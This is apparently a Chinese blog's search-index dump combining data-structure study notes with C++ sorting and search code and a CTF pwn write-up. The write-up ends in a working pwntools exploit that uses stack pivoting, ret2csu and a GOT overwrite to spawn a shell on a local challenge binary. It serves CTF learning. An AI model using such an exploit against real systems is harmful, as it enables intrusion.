findSuccessor(Node&lt;ElementType&gt;* T, ElementType x); //5 交互创建二叉平衡树 void createSubBalanceBiTree(Node&lt;ElementType&gt;*&amp; T, ElementType x); */int main() &#123; int q; cin &gt;&gt; q; Node&lt;int&gt;* root = nullptr; // 初始化根节点为空 BalanceBiTree&lt;int&gt; T(root); while (q-- &gt; 0) &#123; int op; int input; cin &gt;&gt; op &gt;&gt; input; if (op == 1) &#123; // 查询元素 input 的排名 int rank = T.searchXRank(root, input); cout &lt;&lt; rank &lt;&lt; endl; &#125; else if (op == 2) &#123; //查询排名为 input 的元素 int result = T.searchRankValue(root, input); cout &lt;&lt; result &lt;&lt; endl; &#125; else if (op == 3) &#123; // 查询元素 input 的前驱 int predecessor = T.findPredecessor(root, input); cout&lt;&lt; predecessor &lt;&lt; endl; &#125; else if (op == 4) &#123; // 查询元素 input 的后继 int successor = T.findSuccessor(root, input); cout &lt;&lt; successor &lt;&lt; endl; &#125; else if (op == 5) &#123; // 交互式创建二叉平衡树 T.createSubBalanceBiTree(root, input); &#125; &#125; return 0;&#125; # 5. 队列安排","path":"computer-science/Data-Structures/cpp/查找_题解1206/","date":"12-07","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"数据结构与算法食用指南","text":"​ # Review # 1. 绪论 # 1.1 数据结构基本术语（期中已考） 程序 = 算法 + 数据结构 1. 数据（data) 所有能输入到计算机中去的描述客观事物的符号 2、数据元素（data element） 数据的基本单位，也称结点（ node）或记录（record） 3、数据项（data item） 组成数据元素的、有独立含义的、不可分割的数据最小单位，也称域 **/ 字段 (field)** 举个栗子： 关系：数据 &gt; 数据元素 &gt; 数据项 &lt;br/&gt; 例： 学生表 &gt; 个人记录 &gt; 学号、姓名…… 4、数据对象 (Data Object)： 相同特性数据元素的集合，是数据的一个子集 # 1.2 数据结构的两个层次和运算 # 1. 逻辑结构（唯一） 线性结构（一对一）：顺序表、栈、队列、表... 非线性结构（一对多，多对一）：图、树、堆... 另外可以像集合、线性结构、树状结构、图结构区分。 # 2. 存储结构（不唯一） 1. 顺序存储 2. 链式存储 # 3. 数据的运算 逻辑结构和存储结构都相同，但运算不同，则数据结构不同。例如，栈与队列。 插入、删除、修改、查找、排序 # 1.3 抽象数据类型（ADTs） # 1.4 算法与算法分析 # 1. 基本特性 事后统计、事前分析估计来看时间效率 # 2. 时间复杂度 时间复杂度是由嵌套最深层语句的频度决定的 # 6. 图 # 6.1 图的基本术语 # 1. 图的基本区分 ** 无向图：任意两个节点之间的 “边”** 没有方向，可以用（a，b）表示 ** 无向图：** 任意两个节点之间的 “弧” 都有方向，可以用 &lt;a,b&gt; 表示，表示 a 到 b 的弧 # 2. 图的基本概念 学习图的算法前，这之前先学习图的几种存储方式 # 6.2. 图的存储方式 # 1. 邻接矩阵 # 2. 邻接表 # 7. 查找 数据结构：查找 (Search)【详解】_index.search 返回什么结构_UniqueUnit 的博客 - CSDN 博客 # 7.1 查找的基本概念 基本术语 解释 查找 (Searching) 就是根据给定的某个值，在查找表中确定一个其关键字等于给定值的数据元素 (或记录) 查找表 (Search Table) 是由同一类型的数据元素 (或记录) 构成的集合。 关键字 (Key) 数据元素中唯一标识该元素的某个数据项的值，使用基于关键字的查找，查找结果应该是唯一的。例如，在由一个学生元素构成的数据集合中，学生元素中 “学号” 这一数据项的值唯一地标识一名学生。 静态查找表 (Static Search Table) 只作查找操作的查找表 **（查询、检索）** 动态查找表 (Dynamic Search Table) 在查找过程中同时插入查找表中不存在的数据元素，或者从查找表中删除已经存在的某个数据元素。（插入和删除） 平均查找长度 在查找过程中，一次查找的长度是指需要比较的关键字次数，而平均查找长度，则是所有查找过程中进行关键字的比较次数的平均值，其数学定义为 ​ Pi 查找第 i 个元素的概率（1/n） Ci 是查第 i 个元素要的时间 # 7.2 线性表的查找 # 1. 顺序查找 应用范围特点 元素无序、顺序表或线性链表表示的静态查找表 顺序查找的性能分析 一个辅助空间，时间复杂度为 O（n） ASL：(n)=1/n *(1+2+ ... +n) =(n+1)/2（查找成功） ASL：f (n) =n+1（查找不成功） 顺序查找算法的特点 算法简单，对表结构无任何要求（顺序和链式）&lt;br /&gt;n 很大时查找效率较低 &lt;br /&gt; 改进措施： 非等概率查找时，可按照查找概率进行排序 顺序查找算法的改进 非等概率查找时，可按照查找概率进行排序 # 2. 折半查找（重点！！！） 折半查找 (Binary Search) 也称二分查找，它是一种效率较高的查找方法。 应用范围特点 折半查找要求线性表必须采用顺序存储结构， 而且表中元素按关键字有序排列 # 2.1 查找算法 行高亮12345678910int Search_Bin (SSTable ST, keyType key, int low, int high)&#123; if (low&gt;high) return 0; //查找不到时返回0 mid = (low + high)/2; if (key==ST.elem[mid].key) return mid; else if (key&lt;=ST.elem[mid].key) return Search_Bin(ST, key, low, mid - 1); //递归 else return Search_Bin(ST, key, mid + 1, high);&#125; # 2.2 性能分析（判定树（要考）） # 3. 分块查找 # 7.3 树表的查找 # 1. 前言 ・折半查找效率较高，但要求表中记录按关键字有序排列，且不能用链表做存储结构。 ・当表的插入或删除操作频繁时，为维护表的有序性， 需要移动表中很多记录。 ・线性表的查找更适用于静态查找表 (查找的同时对查找表不做修改操作)。 ・对动态查找表进行高效率的查找，可采用几种特殊的二叉树作为查找表的组织形式，在此将它们统称为树表。 # 2. 二叉排序树 中序遍历后从小到大排序，右子树群永远大于 根，左子树群永远小于 根 # 2.1 查找思想 若查找的关键字等于根结点， 成功 否则： 若小于根结点，查其左子树 若大于根结点，查其右子树 在左右子树上的操作类似 代码： # 二叉排序树比较折半查找 二叉排序树上的查找和折半查找相差不大！ ・二叉排序树的平均查找长度仍然和 log2n 是同数量级的。 ・但就维护表的有序性而言，二叉排序树更加有效，因为无需 移动记录，只需修改指针即可完成对结点的插入和删除操作 ・对于需要经常进行插入、删除和查找运算的表（动态查找表）， 采用二叉排序树比较好！ # 2.2 插入思想 若二叉排序树为空，则插入结点应为根结点； 否则，继续在其左、右子树上查找。 树中已有， 不再插入 树中没有， 查找直至某个叶子结点的左子树或右子树为空为止， 则插入结点应为该叶子结点的左孩子或右孩子 二叉排序树插入的基本过程是查找时间复杂度同查找一样，是 O (log2n） 代码： # 2.3 由空树生成二叉排序树 查找 + 插入；另外，插入次序不一样，那么生成的树也不一样。 # 2.4 删除思想（会考） 就是要保证删除前后排序仍然在，主要可以考虑中序遍历之后的数组，用被删除的后元素来补上来。 ・删除叶结点，只需将其双亲结点指向它的指针清零，再释放它即可。 ・被删结点缺右子树，可以拿它的左子女结点顶替它的位置，再释放它。 ・被删结点缺左子树，可以拿它的右子女结点顶替它的位置，再释放它。 ・被删结点左、右子树都存在，可以在它的右子树中寻找中序下的第一个结点 (关键码最小), 用它的值填补到被删结点中，再来处理这个结点的删除问题。 # 3. 平衡二叉树 AVL（重点！！！） 本身是二叉排序树 平衡因子：该结点左子树与右子树的高度差 任一结点的平衡因子只能取： -1、 0 或 1；如果树中任意一个结点的平衡因子的绝对值大于 1，则这棵二叉树就失去平衡， 不再是 AVL 树； 对于一棵有 n 个结点的 AVL 树，其高度保持在 O (log2n) 数量级， ASL 也保持在 O (log2n) 量级 ！！！ # 3.1 插入（常考） 当向一棵 AVL 树中插入一个新的结点，有可能会破坏树的平衡，这时就需要调整这棵树，根据不同的插入位置，一共有四种调整方法，在调整的过程中要注意，一定要满足二叉搜索树的性质。 注意：发现者是第一个不满足这棵树是平衡二叉树的结点，如果有多个结点同时不满足，就选最靠近下面的那个结点作为发现者 1. 插入结点在发现者右子树的右边 RR----&gt; 右单旋 中为支，高右旋 发现者 - 1 -----&gt; -2 2. 插入结点在发现者左子树的左边 LL----&gt; 左单旋 中为支，高左旋 发现者 - 1 -----&gt; -2 3. 插入结点在发现者左子树的右边 LR----&gt; 左右双旋 下二整体先左转，然后和 LL 一样 4. 插入结点在发现者右子树的左边 RL----&gt; 右左双旋 下二整体先右转，然后和 RR 一样 # 3.2 拓展：红黑树 红黑树是一种自平衡的二叉查找树，是一种高效的查找树。它是由 Rudolf Bayer 于 1978 年发明，在当时被称为平衡二叉 B 树 (symmetric binary B-trees)。后来，在 1978 年被 Leo J. Guibas 和 Robert Sedgewick 修改为如今的红黑树。红黑树具有良好的效率，它可在 O (logN) 时间内完成查找、增加、删除等操作。 ......... 学习链接：https://blog.csdn.net/cy973071263/article/details/122543826 # 7.4 哈希查找 ・线性表和树表的查找以关键字比较为基础，查找过程考虑关键字之间的相对大小，记录在存储结构中的位置与关键字无直接关系，查找时间与表长（元素 / 节点个数）有关。 ・在元素的存储位置和关键字本身建立联系，查找时就无需比较或较少比较 ------&gt; 哈希查找 ・这就是散列查找法的思想：通过对元素的关键字值进行某种运算， 直接求出元素的地址，即使用关键字到地址的直接转换方法，而不需要反复比较。 ・散列查找法又叫杂凑法或散列法。 # 1. 基本思想 基本思想： 记录的存储位置与关键字之间存在对应关系， Loc (i)=H (key-i)-----&gt; 哈希函数 用关键字和存储建立联系，查找效率与元素 n 无关 # 2. 哈希函数的构造 # 2.1 直接定址法 # 2.2 除留余数法（重要！！！） # 2.3 构造时考虑 # 3. 哈希表查找冲突处理方法 冲突是指，比如，22 模 11 等于 0，11 也是，但 11 和 22 要存在另一个地方。 # 3.1 开放地址法（开地址） 基本思想： 有冲突时就去寻找下一个空的哈希地址，只要哈希表足够大，空的哈希地址总能找到，并将数据元素存入。 Hi =(Hash(key)+di) mod m (1≤ i &lt; m) 1）线性探测法 di = 1、2、3...... 2）二次探测法 di = 1,-1、4,-4、9,-9...... 3）伪随机探测法 di = x..... 2) 和 3）可以避免二次聚集，但找不到完美的 # 3.2 链地址法（考） 有点像简化剩余系，给每一个定一个妈妈，妈妈下面去放崽崽 # 4. 哈希查找的效率（背） # 7.5 总结 # 8. 排序 【数据结构】八大排序 (超详解 + 附动图 + 源码)_文件记录排序 - CSDN 博客 # 8.1 概述 使一串记录，按照其中的某个或某些关键字的大小，递增或递减的排列起来的操作。 内部排序 和 外部排序： ** 内部排序：** 数据元素全部放在内存中的排序。 ** 外部排序：** 数据元素太多不能同时放在内存中，根据排序过程的要求不能在内外存之间移动数据的排序。 这部分主要是内部排序。 # 8.2 插入排序（边查找边插入） 查找（确定插入位置（查几次））-&gt; 移动元素（涉及移动多少次）--&gt; 插入 😭😭😭😭😭😭😭😭😭插个眼：12 月 4 日李老师宣布 21 号机考，还有期末，呜呜 # 1. 直接插入排序 # （1）哨兵的作用（）：（要考） i&gt;i-1 时，不做操作 i&lt;i-1 时，代表一定会移动元素，交换值时，防止 i 处的值丢失（被覆盖），设置哨兵可以避免 # （2）插入步骤： # （3）算法效率分析（看看🙌） 注意一些细节，第 i 躺比较 i 次，因为还有哨兵。 # 2. 折半插入排序（考） 一些细节了，每次插入，用那个查找的思想，然后当 low&gt;high 时，就 break，此时的 high 就是它的下标，返回 high。 （1）考虑值可以比较大小 （2）考虑值相等的插入 # （1）代码： 行高亮12345678910111213141516171819/*直接插入排序算法，使用折半查找确定待插入元素的位置，并进行相应的后移操作。最后将待插入元素插入到正确的位置上。*/void BInsertSort(SqList &amp;L) &#123; for (int i = 2; i &lt;= L.length; ++i) &#123; L.r[0] = L.r[i]; // 待插入记录暂存监视哨 int low = 1, high = i - 1; // 置查找区间处置 while (low &lt;= high) &#123; // 在r[low..high]中折半查找插入的位置 int m = (low + high) / 2; // 折半 if (L.r[0].key &lt; L.r[m].key) high = m - 1; // 插入点在前一子表 else low = m + 1; // 插入点在后一子表 &#125; for (int j = i - 1; j &gt;= high + 1; --j) L.r[j + 1] = L.r[j]; // 记录后移 L.r[high + 1] = L.r[0]; // r[0]插入到正确位置 &#125;&#125; # （2）算法效率分析（重要） # 3. 希尔插入（生疏） 其实就是一个合并的思想，几个连在一起，视为同一个元素。 # （1）算法思想 # （2）算法实现 # （3）算法特点（要考） # 8.3 交换排序（考点） # 1. 冒泡排序 (n2) 这个我们大一就会嘞，反正暴力循环，每次换前后两个，比较大小来做，这个是我们都会的，上机考试的排序推荐这个。 # 2. 快速排序（nlog2n）（递归实现） # （1）排序思想 有点像推箱子游戏。 # （2）排序过程（理解） 重点是想清楚两个指针的运作模式和控制权的交接。 从两头向中间交替逼近！ 第一种情况：高地址 -&gt; 值 &gt; 枢轴 只执行 high-- 第二种情况：高地址 -&gt; 值 &lt; 枢轴 将 high 的值交给 low（low 此时是个空的）, 并将控制权给 low 模式图： 轴心 ----low........high 其实想一下还是比较好理解的。 （我去，还可以插入动图，新功能！！！） 这里就第一趟结束了，但还没有完全排序，需要继续排，有好几趟。 总之每一趟可以区分两个左右表，轴心一定不会变了。 # （3）源代码与算法评价 # 算法评价（不稳定）： # 代码： # 8.4 选择排序 # 1. 简单选择排序 有点类似于冒泡，算法比较笨拙，在下一次比较中不考虑上一次的比较结果，仍然去继续比较。 # 2. 树型选择排序（锦标赛）（了解） 第一次比较，会经过 n-1 次比较找到较小值 ​ # 3. 堆排序（重点 nlog2n） 堆排序原理及其实现 (C++)_堆排序 c++-CSDN 博客 # （1）什么是堆（还原完全二叉树） 补充： 完全二叉树：若设二叉树的深度为 h，除第 h 层外，其它各层 (1~h-1) 的结点数都达到最大个数，第 h 层所有的结点都连续集中在最左边。 # （2）堆排序 两步：建立堆 -----&gt; 输出极值 # 1）无序序列建成堆 # 2）堆的重新调整 # （3）代码实现 行高亮12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;void adjust(int arr[], int len, int index)&#123; int left = 2*index + 1; int right = 2*index + 2; int maxIdx = index; if(left&lt;len &amp;&amp; arr[left] &gt; arr[maxIdx]) maxIdx = left; if(right&lt;len &amp;&amp; arr[right] &gt; arr[maxIdx]) maxIdx = right; // maxIdx是3个数中最大数的下标 if(maxIdx != index) // 如果maxIdx的值有更新 &#123; swap(arr[maxIdx], arr[index]); adjust(arr, len, maxIdx); // 递归调整其他不满足堆性质的部分 &#125;&#125;void heapSort(int arr[], int size)&#123; for(int i=size/2 - 1; i &gt;= 0; i--) // 对每一个非叶结点进行堆调整(从最后一个非叶结点开始) &#123; adjust(arr, size, i); &#125; for(int i = size - 1; i &gt;= 1; i--) &#123; swap(arr[0], arr[i]); // 将当前最大的放置到数组末尾 adjust(arr, i, 0); // 将未完成排序的部分继续进行堆排序 &#125;&#125;int main()&#123; int array[8] = &#123;8, 1, 14, 3, 21, 5, 7, 10&#125;; heapSort(array, 8); for(auto it: array) &#123; cout&lt;&lt;it&lt;&lt;endl; &#125; return 0;&#125; # （4）算法分析 # 8.5 归并排序（2 &amp; 有序 &gt; 1 &amp; 有序） 外部排序的重要基础，有多路排序 已知，A，B，合成 C 固定两个指针在 A，B，谁小谁插入 C，然后下移，直到 A，B 都空 # 8.6 基数排序 前面的排序方法主要通过关键字值之间的比较和移动而基数排序不需要关键字之间的比较。 # 1. 多关键字排序 # （1）最高位优先 # （2）最低位优先 # 2. 链式基数排序（O (d (n+rd)),O (n+rd) 稳定） 用链表作存储结构的基数排序 # （1）算法思想 打牌思想，先按花色优先，然后再同花色里面排，再给花色排个序，最后连在一起 # （2）算法步骤 # （3）代码实现 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;typedef int KeyType;const int END = -1;const int Radix = 10;typedef struct Node&#123; KeyType key; struct Node *next;&#125;;Node *CreateList()&#123; KeyType x; Node *q = nullptr; cin &gt;&gt; x; while (x != END) &#123; Node *p = new Node; p-&gt;key = x; p-&gt;next = q; q = p; cin &gt;&gt; x; &#125; return q;&#125;int FindDigits(Node *p)&#123; int max = -1; while (p) &#123; if (p-&gt;key &gt; max) max = p-&gt;key; p = p-&gt;next; &#125; int digits = 1; while (max / 10 &gt; 0) &#123; digits++; max = max / 10; &#125; return digits;&#125;void Distribute(Node *&amp;p,int digits, Node *f[], Node *r[])&#123; Node *q; while (p) &#123; q = p; p = p-&gt;next; int k = q-&gt;key; int radix = static_cast&lt;int&gt;(k / pow(10, digits - 1)) % 10; if (r[radix] == nullptr) &#123; r[radix] = q; f[radix] = q; r[radix]-&gt;next = nullptr; &#125; else &#123; q-&gt;next = r[radix]-&gt;next; r[radix]-&gt;next = q; r[radix] = q; &#125; &#125;&#125;void Collect(Node *&amp;p, Node *f[], Node *r[])&#123; p = nullptr; for (int i = Radix - 1; i &gt;= 0; i--) &#123; if (f[i] != nullptr) &#123; r[i]-&gt;next = p; p = f[i]; r[i] = nullptr;//不要忘记这两步!!! f[i] = nullptr; &#125; &#125;&#125;void RadixSort(Node *&amp;p)&#123; Node *f[Radix], *r[Radix]; for (int i = 0; i &lt; Radix; i++) &#123; f[i] = nullptr; r[i] = nullptr; &#125; int digits = FindDigits(p); for (int i = 1; i &lt;= digits; i++) &#123; Distribute(p, i, f, r); Collect(p, f, r); &#125;&#125;void PrintElem(Node *p)&#123; while (p) &#123; cout &lt;&lt; p-&gt;key &lt;&lt; &quot; &quot;; p = p-&gt;next; &#125; cout &lt;&lt; endl;&#125;int main()&#123; Node *p; p = CreateList(); PrintElem(p); cout &lt;&lt; FindDigits(p) &lt;&lt; endl; RadixSort(p); PrintElem(p); return 0;&#125; # （4）算法分析 # 8.7 外部排序 # 1. 外部排序基本方法 其实就是给了一个内存处理限制，就是本地最多同时跑 n 个记录，但有 10n 个元素要排序，这个意思，然后就会采用先分成 10 个归并段（存在外存） 对 10 个两两进行归并排序，得到 5 个归并段（大小为 2n），以此类推，最后得到一个归并段（10n） # 2. 多路平衡归并的实现 # （1）性质 # 3. 最佳归并树 目的：减少读存次数 # 8.8 总结 # 1. 各类排序的比较 # 2. 各类排序的选择","path":"computer-science/Data-Structures/cpp/数据结构与算法复习/","date":"11-27","excerpt":"","tags":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"常见漏洞","text":"慢慢更新，开始投入 # 1.ret2text # 2.ret2syscall # 3.ret2libc # 4.ret2shellcode # # 5.ret2dl # 6.fmt # UAF unlink off-by-null kernelrop double-fetch musl-pwn web-pwn","path":"CTF/Pwn/note/Pwn题型/","date":"11-18","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"一个只有read的程序","text":"​ 近期都很忙，突发奇想在二进制✌（）的引导下想完成这一道所谓的中等题😊😊😊（在这之前补充一下，聊到了凌晨 4 点，现在身心俱疲。） 此前一直做一些简单的板子题度日，堆只看不碰，栈只挑简单的做，真的可恶啊！ # 1.read 原程序 ​ 只有一个 read，明显栈溢出，至于怎么溢出，额，待会细琐。当然这里一眼看过去，shellcode 是最好想到的啊，我们简单看看保护和 vmmap 看看有没有 行高亮1234567解释64位程序，小端序开启部分RELRO-----got表仍可写未开启canary保护-----存在栈溢出开启NX保护-----堆栈不可执行 其实这里没必要看vmmap了，算了熟悉一下指令吧未开启PIE-----程序地址为真实地址动态链接 ​ 显然，这里没有像静态链接程序固定带有的 mprotect 函数，可以去修改内存页的权限为 rwxp，（再调用 read 函数将 pwntools 生成的 shellcode 代码注入到 addr 中，之后再将 read 函数返回地址写为 addr 地址，调用 shellcode，获得 shell），而且就算可以改，也没办法泄露 addr，这个想法被 pass 了。 # 2. 一个可行的 idea - 拓展到栈上的 ret2dl 以前只是见过，今天来实操一下。😋，当然 t1d 说这个题用它做不出来。 # ret2dl 介绍 ​ 对于 NO RELRO 的情况，我们可以利用 read 函数修改 .dynamic 段中的 .dynstr 节的地址，将其修改为我们可控制的地址。然后我们可以在这个地址上构造一个伪造的 fake_dynstr ，将其中的某个字符串替换为 system 函数的字符串。 ​ 接下来，我们可以调用 .dl_fixup 函数，它会解析我们修改的字符串所对应的原函数。 _dl_fixup 函数根据字符串（也就是函数名）来索引函数，因此最终会解析 system 函数。 ​ 无论是 32 位还是 64 位，实现这个过程都相对简单。具体步骤如下： 行高亮1234找到.dynamic段并获取.dynstr节的地址（STRTAB的d_ptr）。使用read函数将.dynstr的地址修改为我们可控制的地址。在可控制的地址上构造一个fake_dynstr，将其中的某个字符串替换为system函数的字符串。调用.dl_fixup函数，它会解析我们修改的字符串所对应的原函数，即system函数。 注：如果是 FULL RELERO ，程序在运行之前就已经调用了 ld.so 将所需的外部函数加载完成，程序运行期间不进行动态加载，因此，在程序的 got 表中， link_map 和 dl_runtime_resolve 函数的地址都为 0 可以参考：【精选】ret2dlresolve 超详细教程 (x86&amp;x64)-CSDN 博客 # 本题的具体实践 ​ 显然，除了上述方法中通过调用 system(&quot;/bin/sh&quot;) 和打 one_gadget 来 getshell 以外，还有一种常见方式就是通过触发 syscall 软中断来 getshell，然而，本题的 ELF 源文件中并没有 syscall 这个 gadget ，并且，我们又无法泄露 libc 信息，用 libc 中的 syscall ，因此，我们需要想办法创造出 syscall 这个 gadget。 ​ 在 t1d 的指引下，我去回顾了一遍 read,write 这些函数。参考文章：ctf 中关于 syscall 系统调用的简单分析 - 知乎 (zhihu.com) 行高亮1234567891011121314151617read()： ssize_t read(int fd,const void *buf,size_t nbytes); //fd 为要读取的文件的描述符 0 //buf 为要读取的数据的缓冲区地址 //nbytes 为要读取的数据的字节数 //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf， //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。write() ssize_t write(int fd,const void *buf,size_t nbytes); //fd 为要写入的文件的描述符 1 //buf 为要写入的数据的缓冲区地址 //nbytes 为要写入的数据的字节数 //write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd， //成功则返回写入的字节数，失败则返回 -1。 ​ 其实，在 libc 中，read，write，close，alarm 等等这些函数只是对系统调用进行了简单的封装，在这些函数中都存在 syscall 这个 gadget，且 syscall 一般离函数的开始地址都很近，故可以将这些函数的 got 表改为 syscall 的地址，从而触发系统调用。 同样我们可以具体看看 ida 里面 read 的汇编：本题的不知道为啥没显示 syscall，显示的是 call😋，下面是博客里的，看着更清晰一点。 行高亮12345将read的系统调用号 0 赋值给 rax将 read的第一个参数0 （fd） 赋值给了 rdi将 read的第二个参数 buf 赋值给了 rsi将 read的第二个参数 buf 赋值给了 rdx即系统调用了 read(0,&amp;buf,0x400) ​ 😋, 要是所有题目都可以直接去把 read 的 got 表改成 syscall，再修改参数执行就好了（） ​ 好了，我们知道，在 64 位中，要想成功 getshell，需要控制的寄存器如下： 行高亮12345rax = 0x3brdi = bin_sh_addrrsi = 0rdx = 0syscall ​ 因此针对本题的思路如下： ​ 我们可以用 ret2csu 先改写 read 的 got 表为 syscall 的地址，有了 syscall 后，再由 read 读入的字节数控制 rax 寄存器（同时读入 /bin/sh 字符串），并用 ret2csu 控制 rdi，rsi，rdx 三个参数，最后调用触发 syscall 即可。t1d 说的大致相同，那我先去实搓了，回来接着写，万一还有坑，做不出来就是🤡了。 2023-11-17 10:53:07 2023-11-18 19:31:07 # 3. 小丑归来🤡 本题目的难点在栈迁，，，，（对我这个菜🐕来说） ​ 断断续续鏖战 1 天，在师傅的敲打下，该碰的坑都碰，先总结得失： 1. 做题要动态调试，一下午可能跑了两三次吧，画表格布栈、打草稿，等等，这些都不如动调来的快 2. 栈迁移的技巧：直接把返回地址写成 read 的 lea rax, [rbp+buf] ，把 rbp 改成想迁移到的地址，这个地址有考究，待会认真说。 3. 巧妙利用 read 实现任意写，布链子。 待会说，自闭了，板子题只是基础，要多见新题，基础打牢，多调题目。 整体来说，对这个 “简单” 的做法还是存在一些疑惑，等弄懂了回来更新。 # 1）栈迁移 一些学习的博客： 栈迁移的原理 &amp;&amp; 实战运用 - ZikH26 - 博客园 (cnblogs.com) 哎，少看，多实践 针对本题具体的是迁移到 read 的虚拟栈，em，还要再学习一下回来具体补充 # 2）ROP 链 像 ret2syscall 一样，直接调用 read_plt # 3）用 csu 改 got 当然这里是和 4 结合在一起的，用 read 控制输入为 0x3b 调节 rax 实现改 got 同时调用 syscall 的作用 # 4.exp 行高亮123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#seccomp-tools dump ./pwn.pwn看哪些被禁用了#栈劫持就是先讨论main函数里的栈迁移，首先利用溢出把ebp的内容给修改掉（修改成我们要迁移的那个地址）#并且把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）#execve：59号系统调用 execve(&quot;/bin/sh&quot;,0,0) r12中填入exceve的地址，其余寄存器置0。#希望控制寄存器为：#rax = 0x3b syscall#rdi = bin_sh_addr#rsi = 0#rdx = 0#syscallfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) p = process(&quot;./pwn.pwn&quot;)elf = ELF(&quot;./pwn.pwn&quot;)#ret2csu的两个gadget#loc_4011B6: pop_rbx_addrgadget1_addr = 0x4011ba#loc_4011A0: mov_rdx_r14_addr gadget2_addr = 0x4011A0 read_plt = elf.plt[&#x27;read&#x27;]read_got = elf.got[&#x27;read&#x27;]#定义利用csu的通用gadget函数#rdi,rsi,rdxdef com_gadget(addr1 , addr2 , jmp2 , arg1 , arg2 , arg3): payload = p64(addr1) + p64(0) + p64(1) + p64(arg1) + p64(arg2) + p64(arg3) + p64(jmp2) + p64(addr2) + b&#x27;a&#x27;*56 # csu = pop_rbx_addr , rbx , rbp , r12 , r13 , r14 , r15 , mov_rdx_r14_addr 56个对应那几个pop return payload gdb.attach(p)pause()#1核心是两次leave_ret#迁移栈：到read的虚拟栈#retret = 0x4040c0+0xa0#leave_ret#read的jmp指令地址leave_ret = 0x401132#rbp放回去的地址payload = b&#x27;a&#x27;*0xa0 #覆盖到返回地址payload += p64(ret) + p64(leave_ret)p.send(payload)pause()#2ROP链条#调用syscallpop_rsi_r15=0x4011c1#参数1的地址0x404200#参数2：0#调用修改后的read-&gt;syscallpayload = p64(pop_rsi_r15)+p64(0x404200)+p64(0)+p64(read_plt)#3调用read修改got表 0x404200-&gt;binsh 0 0payload += com_gadget(gadget1_addr, gadget2_addr, read_got, 0x404200,0,0)#栈迁到read_got的位置并执行leave_ret-&gt;readpayload = payload.ljust(0xa0, b&#x27;a&#x27;)+ p64(read_got+0xa0) + p64(leave_ret)p.send(payload)pause()#4.控制read的读入字节控制rax，实现syscallp.send(b&#x27;\\xd0&#x27;)p.send(b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27;*(0x3b-8))p.interactive() # 5. 更新","path":"CTF/Pwn/solutions/learn/read/","date":"11-17","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"写作模板","text":"这里是写作模板，一般点开此文件复制编辑写文章","path":"模板/","date":"11-12","excerpt":"","tags":[{"name":"博客说明","slug":"博客说明","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/"}]},{"title":"2023大创介绍","text":"...... # 项目简介 ​ 网络犯罪随技术发展而日益泛滥，现有的侦查取证技术却无法满足司法实务需要，让不法分子有可乘之机，严重威胁了个人信息、公民财产乃至国家安全。项目基于前期调研，研究 Android 流量分析技术，拟用 VPN 代理采集流量，集成强化学习模型与 LLMs，基于 LSTM 与 LightGBM 等模型实现本地轻量化；实现应用恶意行为粗识别与风险预警；服务端精检测、有效检出恶意流量并分析取证；结合诉讼法和证据法评估分析并搭建一个基于 B/S 架构的分析报告查询与经验交流网页。 # 项目创新点 1.AI 赋能 Network Traffic Analysis，集成强化学习和 LLMs 高效检出恶意流量，提升 Android、HarmonyOS 应用生态质量。 2. 借助大样本集强化特征工程，构建基于目的、时域等属性的多维特征库。 3. 数字赋能刑事取证突破网络犯罪，搭建辅助取证平台，协查并提供证据线索。","path":"Project/DaChuang/大创介绍/","date":"11-12","excerpt":"","tags":[{"name":"大创","slug":"大创","permalink":"http://example.com/tags/%E5%A4%A7%E5%88%9B/"}]},{"title":"二叉树题解","text":"# 二叉树部分题解 大二上学期，做了一些树的题放一些个人的题解，正在熟悉 C++, 闲来无事时可以翻看。嘿嘿 行高亮1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497